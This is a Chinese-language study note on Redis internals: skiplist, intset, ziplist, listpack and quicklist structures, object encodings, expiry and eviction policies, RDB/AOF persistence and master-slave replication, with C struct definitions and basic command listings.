Redis中只有一个地方用到了跳跃表：**有序集合**。

跳跃表是基于多指针有序链表实现的，可以看成多个有序链表。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\jumptable.png" alt="img" style="zoom:60%;" />
</div>

Redis跳跃表由`redis.h/zskiplistNode和redis.h/zskiplist`两个结构定义，其中`zskiplistNode`结构用于表述跳跃表节点，`zskiplist`结构用于保存跳跃表节点的相关信息，比如节点的数量，以及指向表头结点和表尾节点的指针等等。

#### 跳跃表节点

```c++
typedef struct zskiplistNode{
	// 层
	struct zskiplistLevel{
		// 前进指针
		struct zskipListNode *forward;
		// 跨度，用于计算一个元素的排名
		unsigned int span;
	}level[];
	// 后退指针
	struct zskiplistNode *backward;
	// 分值
	double score;
	// 成员对象
	robj *obj;
}zskiplistNode;
```

- **层：**跳跃表节点的level数组可以包含多个元素，每个元素都包含一个指向其他节点的指针，程序可以通过这些层来加快访问其他节点的速度，一般来说，层的数量越多，访问其他节点的速度就越快。
  - 层数为每次创建一个新跳跃表节点时按照幂次定律（越大的数出现的概率越小）随机生成一个介于1和32之间的值。
- **前进指针**：每个层都有一个指向表尾方向的前进指针（level[i].forward），用于从表头向表尾方向访问节点。
- **跨度**：层的跨度用于记录两个节点之间的距离，两个节点之间的跨度越大，相距就越远；指向NULL的所有前进指针的跨度都为0，因为他们没有连向任何节点。
- **后退指针**：用于从表尾向表头访问节点，一次只能后退至前一个节点。
- **分值和成员**：分值是一个double浮点数，跳跃表中的所有节点按照分值从小到大排序；对象是一个指针，指向一个字符串对象，保存着一个SDS值。

#### 跳跃表结构

```c++
typedef struct zskiplist{
	// 表头节点和表尾节点
	struct zskiplistNode *header, *tail;
	// 表中节点的数量
	unsigned long length;
	// 表中层数最大的节点的层数
	int level;
}zskiplist;
```

- 头尾指针：通过这两个指针程序定位表头节点和表尾节点的复杂度为O(1)
- length：节点个数
- level：层数最大的节点的层数量，头节点层高不算在内。

在查找中，从上层指针开始查找，找到对应的区间之后再到下一层取查找。

与红黑树等平衡树相比，跳跃表具有以下优点：

- 插入速度非常快速，因为不需要进行旋转等操作维护树的平衡性
- 更容易实现
- 支持无锁操作

#### 查找过程

从当前的最高层开始，后继比待查关键字大，下移；比待查关键字小，右移。

#### 为什么不用红黑树

- 范围查找，跳表只要找到最小值之后，对第一层进行遍历就可以了；红黑树需要进行中序遍历
- 跳表的插入删除只需要修改相邻节点的指针；红黑树可能需要进行旋转操作
- 内存占用上来看，跳表要比红黑树更灵活一点。红黑树每个节点包含2个指针，跳表每个节点包含的指针数目可以调整，平均为1/(1-p)个，具体取决于参数p的大小，redis里默认p为1/4，也就是每个节点包含1.33个指针
- 实现简单

### 整数集合（IntSet）

是集合键的底层实现之一，当一个集合只包含整数值元素，并且这个集合的元素数量不多时，Redis就会使用整数集合作为集合键的底层实现。

数据结构：`intset.h/intset`

```
typedef struct intset{
	uint32_t encoding;		// 元素的编码方式
	uint32_t length;
	int8_t contents[];		// 保存元素的数据
}intset;
```

### Sorted Set

**Sorted set** 是排序的 **Set**，去重但可以排序，写进去的时候给一个分数，自动根据分数排序。

有序集合的使用场景与集合类似，但是set集合不是自动有序的，而**Sorted set**可以利用分数进行成员间的排序，而且是插入时就排序好。所以当你需要一个有序且不重复的集合列表时，就可以选择**Sorted set**数据结构作为选择方案。

- 排行榜：有序集合经典使用场景。例如视频网站需要对用户上传的视频做排行榜，榜单维护可能是多方面：按照时间、按照播放量、按照获得的赞数等。
- 用**Sorted Sets**来做带权重的队列，比如普通消息的score为1，重要消息的score为2，然后工作线程可以选择按score的倒序来获取工作任务。让重要的任务优先执行。

微博热搜榜，就是有个后面的热度值，前面就是名称

### 压缩列表（ziplist）

是列表键和哈希键的底层实现之一。当一个列表键只包含少量列表项，并且每个列表项要么就是小整数值，要么是长度比较短的字符串，那么redis就会使用压缩列表来做列表键的底层实现。

```c++
struct ziplist<T>{
	int32 zlbytes;		// 整个压缩列表字节数
	int32 zitail_offset;// 最后一个元素的偏移量
	int16 zllength;		// 元素个数
	T[] entries;		// 元素内容
	int8 zlend;			// 结束标志，恒为0xFF
};

struct entry{
    int<var> prevlen;	// 上一个entry的字节长度，如果长度小于254就用一个字节表示；如果超出就用5个字节表示
    int<var> encoding;	// 元素类型编码，通过前缀位识别具体存储的数据形式
    optional byte[] content;	// 元素内容
};
```

为了支持双向遍历，加入了最后一个元素的偏移量，同时在entry结构体中加入了上一个entry的字节长度。

增加元素时，因为ziplist都是紧凑存储，没有冗余空间意味着插入一个新元素都要调用realloc扩展内存。

### 紧凑链表（listpack）

### listpack 结构设计

listpack 采用了压缩列表的很多优秀的设计，比如还是用一块连续的内存空间来紧凑地保存数据，并且为了节省内存的开销，listpack 节点会采用不同的编码方式保存不同大小的数据。

我们先看看 listpack 结构：

![img](https://cdn.xiaolincoding.com//mysql/other/4d2dc376b5fd68dae70d9284ae82b73a.png)

listpack 头包含两个属性，分别记录了 listpack 总字节数和元素数量，然后 listpack 末尾也有个结尾标识。图中的 listpack entry 就是 listpack 的节点了。

每个 listpack 节点结构如下：

![img](https://cdn.xiaolincoding.com//mysql/other/c5fb0a602d4caaca37ff0357f05b0abf.png)

主要包含三个方面内容：

- encoding，定义该元素的编码类型，会对不同长度的整数和字符串进行编码；
- data，实际存放的数据；
- len，encoding+data的总长度；

可以看到，**listpack 没有压缩列表中记录前一个节点长度的字段了，listpack 只记录当前节点的长度，当我们向 listpack 加入一个新元素的时候，不会影响其他节点的长度字段的变化，从而避免了压缩列表的连锁更新问题**。

### 快速列表（quicklist）

quicklist 的结构体跟链表的结构体类似，都包含了表头和表尾，区别在于 quicklist 的节点是 quicklistNode。

```c
typedef struct quicklist {
    //quicklist的链表头
    quicklistNode *head;      //quicklist的链表头
    //quicklist的链表尾
    quicklistNode *tail; 
    //所有压缩列表中的总元素个数
    unsigned long count;
    //quicklistNodes的个数
    unsigned long len;       
    ...
} quicklist;
```

接下来看看，quicklistNode 的结构定义：

```c
typedef struct quicklistNode {
    //前一个quicklistNode
    struct quicklistNode *prev;     //前一个quicklistNode
    //下一个quicklistNode
    struct quicklistNode *next;     //后一个quicklistNode
    //quicklistNode指向的压缩列表
    unsigned char *zl;              
    //压缩列表的的字节大小
    unsigned int sz;                
    //压缩列表的元素个数
    unsigned int count : 16;        //ziplist中的元素个数 
    ....
} quicklistNode;
```

可以看到，quicklistNode 结构体里包含了前一个节点和下一个节点指针，这样每个 quicklistNode 形成了一个双向链表。但是链表节点的元素不再是单纯保存元素值，而是保存了一个压缩列表，所以 quicklistNode 结构体里有个指向压缩列表的指针 *zl。

我画了一张图，方便你理解 quicklist 数据结构。

![img](https://cdn.xiaolincoding.com//mysql/other/f46cbe347f65ded522f1cc3fd8dba549.png)

在向 quicklist 添加一个元素的时候，不会像普通的链表那样，直接新建一个链表节点。而是会检查插入位置的压缩列表是否能容纳该元素，如果能容纳就直接保存到 quicklistNode 结构里的压缩列表，如果不能容纳，才会新建一个新的 quicklistNode 结构。

quicklist 会控制 quicklistNode 结构里的压缩列表的大小或者元素个数，来规避潜在的连锁更新的风险，但是这并没有完全解决连锁更新的问题。

### rax树

一种有序字典树（基数树Radix Tree），按照key的字典序配列，支持快速定位、插入和删除操作。

主要用在集群节点中用作内部数据结构。记录每个槽存储的键。

![image-20200813105440586](..\assets\post\others\rax.png)



## Redis 数据类型对象

Redis并没有直接使用上述数据结构来实现键值对数据库，而是基于这些数据结构创建了一个对象系统，这个系统包含字符串对象、列表对象、哈希对象、集合对象和有序集合对象这五种类型的对象。

Redis使用对象来表示数据库中的键和值，每次创建一个键值对时，至少会创建两个对象，**一个对象为键对象，一个为值对象**。

Redis每个对象都由一个`redisObject`结构表示，该结构中和保存数据有关的三个属性分别为`type,encoding,ptr`

```
typedef struct redisObject{
	unsigned type:4;		// 4 bits
	unsigned encoding:4;	// 4 bits
	unsigned lru:LRU_BITS;	// 24 bits
	int refcount;			// 4 bytes
	void *ptr;		// 指向底层实现数据结构的指针，占用8 bytes
}robj;
```

- 类型type：`REDIS_STRING, REDIS_LIST, REDIS_HASH, REDIS_SET, REDIS_ZSET`
- 编码encoding：记录了对象所使用的编码，也就是说这个对象使用了什么数据结构作为底层实现的。
  - 每种类型的对象都至少使用了两种不同的编码。
  - 使用命令`OBJECT ENCODING _key`可以获取键值的底层数据结构类型
- ptr指针指向对象的底层实现数据结构。

### 字符串对象

编码可以是`int, raw, embstr`。

- 如果字符串对象保存的是一个**整数值**，并且这个整数值可以用long类型表示，那么字符串对象会将整数值保存在字符串对象数据结构的ptr属性里面，并将字符串对象的编码设置为`int`。否则将其按照字符串格式存储。
- 如果保存的是一个字符串值，并且其长度大于44字节，那么使用SDS保存，并设置为`raw`
- 字符串值超度小于等于44字节，使用`embstr`方式保存。
- 可以用long double类型表示的**浮点数**在redis中也是作为字符串值来保存的。

![image-20200804153945342](..\assets\post\others\embstr+raw.png)

`embstr`存储方式是将`RedisObject`对象头和`SDS`对象连续存在一起，使用`malloc`方法一次性分配。

`raw`存储方式不存在一起，分两次分配空间，使用指针连接。

- 为什么是44字节作为分界点？

- Redis内存分配器`jemalloc/tcmalloc`等分配内存大小的单位都是2,4,8,16,32,64等，为了能容纳一个完整的`embstr`对象，`jemalloc`最少会分配32个字节的空间，如果字符再长一点，就是64字节的空间。如果更长就会按照raw方式分两次分配空间存储
- 当分配为64字节时，对象头占用16字节，SDS的len和free占用3字节，还有最后一个字符'\0'，所以最大为64-16-3-1=44字节。

### 列表对象

编码使用`quicklist`。

### 哈希对象

编码可以是`ziplist`或者`hashtable`。

`ziplist`编码的哈希对象使用压缩列表作为底层实现，每当有新的键值对要加入到哈希对象时，程序会先将保存了键的压缩列表节点推入到压缩列表表尾，然后再将保存了值的压缩列表节点推入到压缩列表表尾。

`hashtable`编码的哈希对象使用字典作为底层实现，哈希对象的每个键值对都是用一个字典键值来保存。

- 字典的每个键都是一个字符串对象，对象中保存了键值对的键
- 字典的每个值都是一个字符串对象，对象中保存了键值对的值

当哈希对象同时满足以下两个条件时，哈希对象使用ziplist，否则使用hashtable编码

- 哈希对象保存的所有键值对的键和值的字符串长度都小于64字节
- 哈希对象保存的键值对数量小于512个

### 集合对象

编码可以是`intset`或者`hashtable`。

`intset`编码的集合对象使用整数集合作为底层实现，集合对象包含的所有元素都被保存在整数集合里面。

`hashtable`编码的集合对象使用字典作为底层实现，字典的每个键都是一个字符串对象，每个字符串对象包含了一个集合元素，字典的值全被设为NULL。

当集合对象同时满足以下两个条件时，使用`intset`编码：

- 集合对象保存的所有元素都是整数值
- 元素数量不超过512个。

### 有序集合对象

有序集合对象的编码可以是`ziplist`或者`skiplist`。

`ziplist`编码的压缩列表对象使用压缩列表来作为底层实现，每个集合元素使用两个紧挨在一起的压缩列表节点来保存。第一个节点保存元素的成员（member），第二个节点保存元素的分值（score）。

- 压缩列表里的集合元素按分值从小到大进行排序，**分值较小的元素被放置在靠近表头的方向，分值大的放置在靠近表尾的方向。**

`skiplist`编码的有序集合对象使用`zset`结构作为底层实现，一个`zset`结构同时包含一个字典和一个跳跃表。

```
typedef struct zset{
	dict *dict;
	zskiplist *zsl;
}zset;
```

- `zsl`跳跃表按照分值从小到大保存了所有集合元素，每个跳跃表节点都保存了一个集合元素：跳跃表节点的object属性保存了元素的成员，跳跃表节点的score属性保存了元素的分值。通过跳跃表，可以对有序集合进行范围型操作。
- `dict`字典为有序集合创建一个成员到分值的映射，字典的每个键值都保存了一个集合元素：字典的键保存了元素的成员，字典的值保存元素的分值。通过字典，可以以O(1)复杂度查找给定成员的分值。
- **注意**：有序集合的每个元素成员都是一个字符串对象，每个元素的分值都是一个double类型的浮点数。
  - `zset`结构同时使用`zsl`和`dict`来保存有序集合元素，但是这两种数据结构都会通过指针来**共享相同元素的成员和分值**。
- 当有序集合对象同时满足以下两个条件的时候，对象使用`ziplist`编码：
  - 有序集合保存的元素数量小于128个
  - 所有元素成员的长度都小于64字节

### Bitmap

位图是支持按 bit 位来存储信息，可以用来实现 **布隆过滤器（BloomFilter）**；

### **HyperLogLog**

供不精确的去重计数功能，比较适合用来做大规模数据的去重统计，例如统计 UV；

### **Geospatial**

可以用来保存地理位置，并作位置距离计算或者根据半径计算位置等。有没有想过用Redis来实现附近的人？或者计算最优地图路径？

### **pub/sub：**

功能是订阅发布功能，可以用作简单的消息队列。

### **Pipeline**

可以批量执行一组指令，一次性返回全部结果，可以减少频繁的请求应答。

### **Lua**

**Redis** 支持提交 **Lua** 脚本来执行一系列的功能。

### **事务**

最后一个功能是事务，但 **Redis** 提供的不是严格的事务，**Redis** 只保证串行执行命令，并且能保证全部执行，但是执行命令失败时并不会回滚，而是会继续执行下去。

## Redis 数据类型命令

| 数据类型 | 可以存储的值           | 操作                                                         |
| -------- | ---------------------- | ------------------------------------------------------------ |
| STRING   | 字符串、整数或者浮点数 | 对整个字符串或者字符串的其中一部分执行操作 对整数和浮点数执行自增或者自减操作 |
| LIST     | 列表                   | 从两端压入或者弹出元素 对单个或者多个元素进行修剪， 只保留一个范围内的元素 |
| SET      | 无序集合               | 添加、获取、移除单个元素 检查一个元素是否存在于集合中 计算交集、并集、差集 从集合里面随机获取元素 |
| HASH     | 包含键值对的无序散列表 | 添加、获取、移除单个键值对 获取所有键值对 检查某个键是否存在 |
| ZSET     | 有序集合               | 添加、获取、删除元素 根据分值范围或者成员来获取元素 计算一个键的排名 |

### String：字符串

```bash
APPEND	_key _string	# 向key的value后追加字符串，如果不存在相当于set key
STRLEN	_key			# 获取key的长度
INCR	_key			# key的value自加1
DECR	_key			# key的value自减1
INCR	_key	_num	# key的value自加num
DECR	_key	_num	# key的value自减num

GETRANGE_key start end	# 截取[start,end]范围的字符串，-1表示最后一个
SETRANGE_key offset string	# 替换从offset开始的之后的字符串

SETEX	_key _time _string	# 设置带有过期时间的key
SETNX	_key _string		# 不存在时设置

MSET	_key _value _key _value	# 批量设置key
MGET	_key _key			# 批量获取key
MSETNX	_key _value			# 批量设置不存在的，原子性操作，要么全部成功，要么一起失败
```

### List：列表（可以重复）

```
RPUSH 	_list _item		# 从list右边插入value，如果没有list就创建
LPUSH	_list _item		# 从左边插入
RPOP	_list			# 从右边删除一个
LPOP	_list			# 从左边删除一个
LRANGE	_list start end	# 获取list中范围value
LINDEX	_list _index		# 获取指定位置的value
```

### SET：集合（不可重复，无序）

集合是通过哈希表实现的。集合中最大的成员数为2^32-1（即每个集合可存储40多亿个成员）

```
SADD	_set _item		# 集合中插入一个value，如果没有就创建
SMEMBERS_set			# 获取集合所有value
SISMEMBER _set _item	# 查看item是否在集合中
SREM	_set _item		# 移除元素
```

### Hash：哈希表

```bash
HSET	_hash _key _value	# 在_hash表中设置_key和_value
HGETALL	_hash				# 获取_hash表中所有键值对
HDEL	_hash _key			# 删除_hash表中指定键
HGET	_hash _key			# 获取指定键
```

### ZSET：有序集合

每个元素都会关联一个double类型的分数，redis时通过分数为集合中的成员从小到大进行排序的。

有序集合成员是唯一的，但是分数是可以重复的。

```
ZADD	_zset _score _mem	# 向zset有序集合中添加成员
ZRANGE	_zset start end WITHSCORES	# 获取范围内成员，WITHSCORES参数表示同时获取分数
ZRANGEBYSCORES	_zset start end WITHSCORES	# 根据分数范围获取
ZREM	_zset _mem			# 移除成员
```

## Redis数据库设计&过期删除

Redis服务器将所有的数据库保存在服务器状态`redis.h/redisServer`的db数组中，db数组的每个项都是一个`redis.h/redisDb`，每个redisDb结构代表一个数据库。

Redis中数据库的数量会根据dbnum的值进行创建，默认情况下dbnum值为16.

```c
typedef struct redisDb {
    dict *dict;
    dict *expires;
    int id;
} redisDb;
```

### 数据库键空间

Redis是一个键值对（key-value pair）数据库服务器，服务器中的每个数据库都有一个`redis.h/redisDb`结构表示，其中redisDb结构中的dict字典保存了数据库中的所有键值对，这个字典称为键空间（key space）

- 键空间的键也就是数据库的键，每个键都是一个字符串对象
- 键空间的值也就是数据库的值，每个值可以是字符串对象、列表对象、哈希表对象、集合对象和有序集合对象中的任意一种redis对象。

因为数据库的键空间是一个字典，所有所有针对数据库的操作（添加，删除，更新，取值），实际上都是通过对键空间字典进行操作来实现的。

### 数据库过期删除

redisDb结构的expires字典保存了数据库中所有键的过期时间，这个字典称为过期字典。

- 过期字典的键是一个指针，这个指针指向键空间中的某个键对象（也就是某个数据库键）
- 过期字典的值是一个long long类型的整数，这个整数保存了键所指向的数据库键的过期时间--一个毫秒精度的UNIX时间戳。

**如果的大量的key过期时间设置的过于集中，到过期的时间点，redis可能会出现短暂的卡顿现象。一般需要在过期时间上加一个随机值，使得过期时间分散一些**

#### 过期删除策略

- **定时删除（不使用）**：设置键的过期时间的同时，创建一个定时器（timer），让定时器在键的过期时间来临时，立即执行对键的删除操作。
  - 优点：对于内存是最友好的，通过使用定时器，定时删除策略可以保证过期键尽快删除，并释放内存空间
  - 缺点：对于CPU不友好，在过期键比较多的情况下，删除过期键会占用相当一部分的CPU时间。
  - 其次，创建一个定时器需要用到Redis的时间事件，而时间事件的实现方式无序链表，查找一个事件的时间复杂度为O(N)，会导致不能高效的处理大量时间事件。
- **惰性删除**：放任键过期不管，但是每次从键空间来获取键时，先检查该键是否过期，如果过期就删除，否则就返回
  - 使用`redis.c/expireIfNeeded`函数实现，如果输入键未设置过期时间或者设置过期时间但未过期，不做动作；否则删除键。
  - 优点：对CPU友好，删除的目标仅限于当前处理的键，不会在删除其他无关的过期键上花费任何CPU时间
  - 缺点：对内存不友好，可能会存在大量不使用的键，可以将这种情况看成一种内存泄漏
- **定期删除**：每隔一段时间，程序对数据库进行检查，删除过期键
  - 使用`redis.c/activeExpireCycle`函数实现，分多次遍历每个数据库，从数据库中的expires字典中**随机检查**一部分键的过期时间，并删除其中的过期键。其中`current_db`记录了最后被检查的数据库，下次定期删除的时候从该数据库开始遍历。
  - 通过限制删除操作执行的时长和频率来减少操作对CPU时间的影响
  - 通过定其删除过期键有效的减少了因为过期键带来的内存浪费
  - 但是确定删除操作执行的时长和频率是一个难点。

#### 过期删除对持久化和复制的影响

- RDB持久化
  - 写入RDB文件不会产生影响，因为写入该文件时会首先检查是否过期
  - 载入RDB文件，服务器为主服务器模式时过期键会被忽略，从服务器模式时无论键是否过期都会被载入到数据库中。
- AOF持久化
  - 写入AOF文件，当过期键被惰性删除或者定期删除之后，程序会向AOF文件后追加一条DEL命令，显式记录该键已被删除。
  - 重写AOF文件，已过期的键不会被保存到重写后的AOF文件
- 复制
  - 当服务器运行在复制模式下时，从服务器的过期键删除动作由主服务器控制；
    - 主服务器在删除一个过期键之后，会**显式**的向所有服务器发送一个DEL命令，告知从服务器删除这个过期键
    - 从服务器在执行完客户端发送的读命令后，即使碰到过期键也不会删除，而是继续像处理未过期的键一样来处理过期键
    - 从服务器只有接到主服务器发来的DEL命令之后才会删除过期键。

### 数据库通知

该功能可以让客户端通过订阅给定的频道或者模式，来获知数据库中键的变化，以及数据库中命令的执行情况。

`notify-keyspace-events`选项决定了服务器所发送通知的类型：

- `AKE`：发送所有类型的键空间通知和键空间事件通知
- `AK`：发送所有类型的键空间通知
- `AE`：发送所有类型的键事件通知
- `K$`：只发送和字符串键有关的键空间通知
- `El`：只发送和列表键有关的键事件通知

#### 发送通知

该功能由`void notifyKeyspaceEvent(int type, char *event, robj *key, int dbid)`函数实现

## Redis数据淘汰策略-内存满

可以设置内存最大使用量，当内存使用量超出时，会实行数据淘汰策略。

Redis中有6中淘汰策略：

| 策略            | 描述                                                 |
| --------------- | ---------------------------------------------------- |
| volatile-lru    | 从已设置过期时间的数据集中挑选最近最少使用的数据淘汰 |
| volatile-ttl    | 从已设置过期时间的数据集中挑选将要过期的数据淘汰     |
| volatile-random | 从已设置过期时间的数据集中任意选择数据淘汰           |
| allkeys-lru     | 从所有数据集中挑选最近最少使用的数据淘汰             |
| allkeys-random  | 从所有数据集中任意选择数据进行淘汰                   |
| noeviction      | 禁止驱逐数据                                         |

作为内存数据库，处于对性能和内存消耗的考虑，redis的淘汰算法实际实现上并非针对所有key，而是抽样一部分并且选出被淘汰的key。

使用redis缓存数据时，为了提高缓存命中率，需要保证缓存数据都是热点数据，可以将内存最大使用量设置为热点数据占用的内存量，然后使用`allkeys-lru`淘汰策略，将最近最少使用的数据淘汰。

## Redis持久化

Redis是内存型数据库，为了保证数据在断电后不会丢失，需要将内存中的数据持久化到硬盘上。

通常将服务器中的非空数据库以及他们的键值对统称为数据库状态。

bgsave做镜像全量持久化，aof做增量持久化。因为bgsave会耗费较长时间，不够实时，在停机的时候会导致大量丢失数据，所以需要aof来配合使用。在redis实例重启时，会使用bgsave持久化文件重新构建内存，再使用aof重放近期的操作指令来实现完整恢复重启之前的状态。

**对方追问那如果突然机器掉电会怎样？取决于aof日志sync属性的配置，如果不要求性能，在每条写指令时都sync一下磁盘，就不会丢失数据。但是在高性能的要求下每次都sync是不现实的，一般都使用定时sync，比如1s1次，这个时候最多就会丢失1s的数据。**

**对方追问bgsave的原理是什么？你给出两个词汇就可以了，fork和cow。fork是指redis通过创建子进程来进行bgsave操作，cow指的是copy on write，子进程创建后，父子进程共享数据段，父进程继续提供读写服务，写脏的页面数据会逐渐和子进程分离开来。**

### RDB持久化

将某个时间点的所有数据（RDB文件）都存放在硬盘上。

可以将快照复制到其他服务器从而创建具有相同数据的服务器副本。

如果系统发生故障，将会丢失最后一次创建快照之后的数据。

如果数据量很大，保存快照的时间很长。

#### RDB使用命令

- SAVE命令：阻塞Redis服务器进程，直到RDB文件创建完毕为止，在服务器进程阻塞期间，服务器不处理任何命令请求。
- **BGSAVE命令**：派生一个子进程，由子进程负责创建RDB文件。`BGSAVE`和`SAVE、BGSAVE、BGREWRITEAOF`命令冲突。

#### RDB的优缺点

它的优点有：

- RDB 是在某个时间点上的数据快照，非常适合使用在全量备份的情况，生成的 RDB 是一个紧凑压缩的二进制文件。快照产生的 RDB 文件可以拷贝到远程机器或文件系统中，用于灾难恢复；
- RDB 的加载恢复数据速度快于 AOF 的恢复方式。

它的缺点有：

- 因为 bgsave 每次运行都要执行 fork 操作创建子进程，操作比较繁琐，如果实时存储快照会导致成本过高，所以 RDB 只能在特定条件下进行一次持久化，从而容易出现数据丢失的情况；
- RDB 文件是一个特定二进制格式保存的文件，Redis 的版本更新过程中，有对 RDB 的版本格式修改，会出现老版本的 RDB 文件无法兼容新版本的 RDB 格式问题。

#### RDB文件结构

一个完整的RDB文件包含五部分：`REDIS, db_version, databases, EOF, check_sum`

- `REDIS`：RDB文件标识，存储的是REDIS五个字符
- `db_version`：长度4个字节，一个字符串表示的整数，记录了RDB文件的版本号
- `databases`：包含零个或者任意多个数据库，以及各个数据库中的键值对数据
  - 如果服务器的数据库状态为空，那么这个部分也为空，长度为0字节
  - 如果数据库状态为非空，那么这个部分也为非空
- `EOF`：长度为1个字节，标志RDB文件正文内容结束
- `check_sum`：8字节长度的无符号整数

### AOF持久化

将写命令添加到AOF文件的末尾。（Append Only File），是通过保存Redis服务器所执行的写命令来记录数据库状态的。

使用AOF持久化需要设置同步选项，从而确保写命令同步到磁盘文件上的时机。这时因为对文件进行写入并不会马上将内容同步到磁盘上，而是先存储到缓冲区，然后由操作系统决定什么时候同步到磁盘。

| 选项     | 同步频率                 |
| -------- | ------------------------ |
| always   | 每个写命令都同步         |
| everysec | 每秒同步一次             |
| no       | 让操作系统来决定何时同步 |

- always 选项会严重减低服务器的性能；
- everysec 选项比较合适，可以保证系统崩溃时只会丢失一秒左右的数据，并且 **Redis 每秒执行一次同步对服务器性能几乎没有任何影响；**
- no 选项并不能给服务器性能带来多大的提升，而且也会增加系统崩溃时数据丢失的数量。

随着服务器写请求的增多，AOF 文件会越来越大。Redis 提供了一种将 AOF 重写的特性，能够去除 AOF 文件中的冗余写命令。

####  AOF 持久化机制的优缺点

它的优点有：

- AOF 持久化可以保证数据非常完整，故障恢复时相对 RDB 持久化丢失的数据最少；
- 由于 AOF 是可以实时对缓存命令追加到 AOF 文件的末尾，所以可以对历史操作的缓存命令进行处理。

它的缺点有：

- 由于 AOF 持久化是不断对 AOF 文件进行追加记录的，会导致 AOF 文件体积很大，极端的情况下可能会出现 AOF 文件用完硬盘的可用空间；但是 Redis 2.4 版本以后支持 AOF 自动重写，有效的解决 AOF 文件过大的问题；
- 当 AOF 文件体积很大时，会出现恢复速度慢，对性能影响大的问题；
- 当开启 AOF 后，对 QPS 会有一定影响，相对 RDB 来说，写 QPS 会下降。

#### AOF持久化的实现

AOF持久化的实现可以分为**命令追加（append），文件写入（写入内存缓冲区），文件同步（sync，写入真实文件）**三个步骤。

- 命令追加：服务器在执行完一个写命令之后，会以协议格式将被执行的写命令追加到服务器状态的`aof_buf`缓存区的末尾。
- 文件写入：服务器在处理文件事件时可能会执行写命令，使得一些内容被追加到`aof_buf`缓冲区中，所以在服务器每次结束一个事件循环之前，都会调用`flushAppendOnlyFile`函数，考虑是否将缓冲区内容写入和保存到AOF文件里面。
  - `flushAppendOnlyFile`函数的行为可以通过配置`appendfsync`选项的值来决定，
    - 当为`always`时将缓冲区的内容写入并同步到AOF文件中，最安全的，但是效率最慢；
    - `everysec`将缓冲区内容写入到AOF文件中，如果上次同步AOF时间为一秒前，就对AOF文件进行同步，如果出现故障只会丢失1s内的数据，效率适当；
    - `no`将`aof_buf`缓冲区内容写入到AOF文件，但是并不对其进行同步，何时同步由操作系统决定，安全性最低，效率和everysec差不多。

#### AOF文件的载入与数据还原

- 创建一个没有网络连接的伪客户端
- 从AOF文件中分析并读取写命令，并使用伪客户端执行该命令

#### AOF重写

可以使原本包含很多冗余命令的AOF文件减小很多，所以文件大小也会小很多，最后数据还原的结果是相同的。

- 原理：首先从数据库中读取键现在的值，然后用一条命令区记录键值对，代替之前记录这个键值对的多条命令。

###  Redis 持久化机制 AOF 和 RDB 有哪些不同之处？

RDB 和 AOF 的区别：

- 持久化的方式不同：RDB 持久化是在指定时间间隔内保存数据快照到硬盘中（快照的方式）。AOF 持久化是把命令追加到操作日志的尾部，然后保存所有历史操作（追加文件）。
- 恢复的数据安全性不同：RDB 恢复数据时，恢复后的数据中，存在丢失最近一次生成快照之后更改的所有数据；AOF 持久化的数据实时性和安全性更高。
- 缓存恢复的速度不同：RDB 产生的文件紧凑压缩高，读取 RDB 文件恢复时速度比 AOF 快；由于 AOF 实时追加写命令，所以 AOF 的缓存文件体积比较大，但是可以通过重写（rewrite）压缩 AOF 持久化文件体积。

###  如何选择合适的持久化方式？

在实际的生产环境当中对于选择 RDB 持久化方式还是 AOF 持久化方式都需要根据数据量、应用对数据的安全要求、硬件相关预算等情况综合考虑，同时也可以考虑主从复制的策略，可以设置主机（master）和从机（slave）使用不同的持久化方案。对此以下只是简单的进行一个选择的介绍，具体在实际的开发应用过程中还需要根据实际情况综合选择。

- 如果在一段时间内对 Redis 里的数据完全丢弃也不会有什么影响的情况，那么选择 RDB 持久化方式比选择 AOF 持久化更有利；但是如果需要预防数据秒级别的丢失时，就只能选择 AOF 持久化方式了。
- 当 Redis 的结构是主从架构的情况下，可以考虑使用读写分离来分担 Redis 的读请求压力，也预防主机（master）宕机后继续提供服务。这时候可以采用这样一种策略：关闭主机（master）的持久化功能，这样保持主机（master）的高效性，然后关闭从机（slave）的 RDB 持久化，开启 AOF 持久化，同时建议关闭 AOF 的自动重写功能，通过设置一个定时任务，在应用访问次数比较少的时间点再通过调用 bgrewriteaof 命令进行自动重写，为了防止持久化数据的丢失，建议设置一个定时器在某个时间点对持久化文件进行备份并标记好备份时间点。

## Redis主从复制

Redis中，可以通过执行`SLAVEOF`命令或者设置`slaveof`选项，让一个服务器去复制（replicate）另一个服务器，被复制的称为主服务器（master），进行复制的被称为从服务器（slave）。

Redis的复制功能分为两个操作：同步（sync）和命令传播（command propagate）：

- 同步操作用于将从服务器的数据库状态更新至主服务器当前所处的数据库状态
- 命令传播用于在主服务器的数据库状态被修改，导致主从服务器的数据库状态出现不一致，让主从服务器的数据库重新回到一直状态。

### Redis 的主从复制模式有什么优缺点？

主从复制的模式相对于单节点的好处在于，实行读写分离提高了系统的读写效率，提高了网站数据的读取加载速度。但是缺点是由于写数据主要在主节点上操作，主节点内存空间有限，并且主节点存在单点风险。

### SYNC

- 从服务器向主服务器发送SYNC命令
- 收到SYNC命令的主服务器执行BGSAVE命令，在后台生成一个RDB文件，并使用一个缓冲区记录从现在开始执行的所有写命令。
- 当主服务器的BGSAVE命令执行完毕，主服务器会将生成的RDB文件发送给从服务器，从服务器载入这个文件，将自己的数据库更新至主服务器执行BGSAVE时的数据库状态
- 主服务器将记录在缓冲区里面的所有写命令发送给从服务器，从服务器执行这些命令将自身状态更新到主服务器当前状态。

SYNC是一个非常耗费资源的操作：

- 生成RDB文件会耗费大量的CPU、内存和磁盘IO资源
- 传送RDB文件给从服务器会耗费主从服务器上的大量网络资源，并对主服务器响应命令请求的时间产生影响
- 从服务器载入RDB文件会因为阻塞而无法处理命令请求。

### 命令传播

主服务器将自己执行的写命令，发送给从服务器执行，这样可以保持一致状态。

### PSYNC

为了解决旧版复制功能在处理断线重复情况时的**低效问题**，Redis使用PSYNC命令代替SYNC命令来执行复制时的同步操作。

PSYNC命令具有完整重同步（full resynchronization）和部分重同步（partial resynchronization）两种模式：

- 完整重同步用于处理初次复制情况：完整重同步的执行步骤和SYNC命令的执行步骤基本一样，都是通过让主服务器创建并发送RDB文件，以及向服务器发送保存在缓冲区里面的写命令来进行同步。
- 部分重同步则用于处理短线后重复制情况：当服务器在断线后重新连接主服务器时，如果条件允许，主服务器可以将主服务器连接断开期间执行的写命令发送给从服务器，从服务器只要接收并执行这些写命令，就可以将数据库更新到主服务器当前所处的状态。

#### 部分重同步的实现

有三个部分构成：

- 主服务器的复制偏移量（replication offset）和从服务器的复制偏移量
- 主服务器的复制积压缓冲区（replication backlog）
